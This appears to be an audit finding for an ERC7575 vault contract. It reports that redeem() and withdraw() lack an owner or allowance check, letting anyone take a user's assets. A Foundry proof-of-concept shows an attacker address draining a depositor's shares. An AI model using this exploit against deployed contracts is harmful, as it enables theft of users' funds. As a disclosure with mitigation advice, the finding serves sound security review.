  "body": "## Finding description and impact\n\nThe `redeem()` and `withdraw()` functions of `WERC7575Vault.sol` doesn't check if ``owner == msg.sender`` or does the ``msg.sender`` have allowance for the ``owner shares``.\n\n```solidity\n./WERC7575Vault.sol\n\n    function withdraw(uint256 assets, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 shares) {\n        shares = previewWithdraw(assets);\n        _withdraw(assets, shares, receiver, owner);\n    }\n```\n\n```solidity\n./WERC7575Vault.sol\n\n    function redeem(uint256 shares, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 assets) {\n        assets = previewRedeem(shares);\n        _withdraw(assets, shares, receiver, owner);\n    }\n```\n```solidity\n./WERC7575Vault.sol\n\n    function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n        if (receiver == address(0)) {\n            revert IERC20Errors.ERC20InvalidReceiver(address(0));\n        }\n        if (owner == address(0)) {\n            revert IERC20Errors.ERC20InvalidSender(address(0));\n        }\n        if (assets == 0) revert ZeroAssets();\n        if (shares == 0) revert ZeroShares();\n\n\n        _shareToken.spendSelfAllowance(owner, shares);\n        _shareToken.burn(owner, shares);\n        SafeTokenTransfers.safeTransfer(_asset, receiver, assets);\n        emit Withdraw(msg.sender, receiver, owner, assets, shares);\n    }\n```\n\nThe only check is for ``spendSelfAllowance(owner, shares);`` but it does nothing.\n```solidity\n./WERC7575ShareToken.sol\n\n    function spendSelfAllowance(address owner, uint256 shares) external onlyVaults {\n        _spendAllowance(owner, owner, shares);\n    }\n```\n\nThe ``self allowance`` mechanism is for resolving `` Settlement disputes before withdrawal to prevent carriers from withdrawing during fraud investigation``.\n\nThat's why ``self-allowance`` requires ``validator`` signature.\n```solidity\n./WERC7575ShareToken.sol\n\n    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public virtual {\n\n...\n\n        if (owner == spender) { // self-allowance\n            if (signer != _validator) {\n                revert ERC2612InvalidSigner(signer, owner);\n            }\n        } else {\n            if (signer != owner) {\n                revert ERC2612InvalidSigner(signer, owner);\n            }\n        }\n        _approve(owner, spender, value);\n    }\n```\n```solidity\n./WERC7575ShareToken.sol\n\n    function approve(address spender, uint256 value) public virtual override returns (bool) {\n        if (msg.sender != spender) {\n            return super.approve(spender, value);\n        }\n        revert ERC20InvalidSpender(msg.sender);\n    }\n\n```\n\nThus, any ``owner`` who wants to redeem their own ``shares`` for ``assets`` needs to have ``self-allowance``.\n\nAlso, this finding by ``V12`` is invalid due to the above reason:\nhttps://github.com/code-423n4/2025-11-sukukfi/blob/main/2025_11_sukukfi_v12.md#incorrect-allowance-spending-in-spendselfallowance\n\nAlso, the ``KYC`` can't save this exploit as only ``owner`` needs to be ``KYC'd`` in ``burn()``.\n\n```solidity\n    function burn(address from, uint256 amount) external onlyVaults whenNotPaused {\n        if (from == address(0)) {\n            revert IERC20Errors.ERC20InvalidSender(address(0));\n        }\n        if (!isKycVerified[from]) revert KycRequired();\n        _burn(from, amount);\n    }\n```\n\nThus, Any ``attacker`` or Any ``carrier with unresolved dispute`` can steal funds from the vault.\n\n> Due to the nature of the ERC7575 multi-asset vaults, the shares of owner in USDC vault can be used to withdraw from ETH vault. \n\n## Recommended mitigation steps\n\nOnly allow withdrawals if ``msg.sender == owner``.",
  "proof_of_concept": "```solidity\n    function test_poc1() public {\n        uint256 depositAmount = 1000 * 1e18;\n\n        // User1 deposits some tokens\n        vm.startPrank(user1);\n        token.approve(address(vault), depositAmount);\n        uint256 shares = vault.deposit(depositAmount, user1);\n        vm.stopPrank();\n\n        // User 1 gets self allowance through permit before withdrawing\n        uint256 deadline = block.timestamp + 3600;\n        bytes32 structHash = keccak256(\n            abi.encode(\n                keccak256(\n                    \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n                ),\n                user1,\n                user1,\n                shares,\n                shareToken.nonces(user1),\n                deadline\n            )\n        );\n\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                \"\\x19\\x01\",\n                shareToken.DOMAIN_SEPARATOR(),\n                structHash\n            )\n        );\n\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPrivateKey, digest);\n\n        // self permit is required*\n        shareToken.permit(user1, user1, shares, deadline, v, r, s);\n        \n        // As soon as the self allowance happens, attacker redeems setting themselves as receiver.\n        address attacker = makeAddr(\"attacker\");\n        vm.startPrank(attacker); //startPrank is really not necessary as msg.sender is never checked.\n        uint256 assetsRedeemed = vault.redeem(shares, attacker, user1); // attacker address is the receiver\n        vm.stopPrank();\n\n        assertEq(assetsRedeemed, depositAmount); // assets are successfully redeemed.\n        assertEq(shareToken.balanceOf(user1), 0); // user1 shares got burnt\n        assertEq(token.balanceOf(user1), 0); // user1 gets nothing\n        assertEq(token.balanceOf(attacker), AMOUNT * 10); // attacker stole the assets\n    }\n```\nPaste the above PoC in ``WERC7575.t.sol`` and run it using:\n```\nforge test --match-test test_poc1 -vv\n```",
